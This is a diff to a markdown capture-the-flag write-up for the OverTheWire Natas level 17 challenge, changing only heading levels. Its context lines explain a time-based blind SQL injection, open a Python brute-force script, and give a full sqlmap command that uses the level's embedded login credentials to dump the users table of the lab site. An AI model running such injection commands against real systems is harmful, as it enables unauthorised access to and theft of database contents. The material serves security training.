@@ -17,7 +17,8 @@
 ```
 * Notice that the condition after 'AND' execute only if the previous condition returns TRUE, so if the password condition return true the response should be delayed by 5sec
 * We can implement this approach in two ways:
-##### Python Script
+
+#### Python Script
 * To perform brute-force to retrieve the password using Time-based attack use this python script:
 ```py
   import requests, string
@@ -48,7 +49,7 @@
               break
 ```
 
-##### Sqlmap
+#### Sqlmap
 * Use this command to retreive the password using sqlmap *(Database name and columns name can be found in the sourcecode)*
 ```sh
   sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --auth-type=Basic --auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw --data="username=natas18" --level=3 --risk=1 --technique=T --threads=4 --dbms=MySQL -D natas17 -T users -C username,password --dump --batch
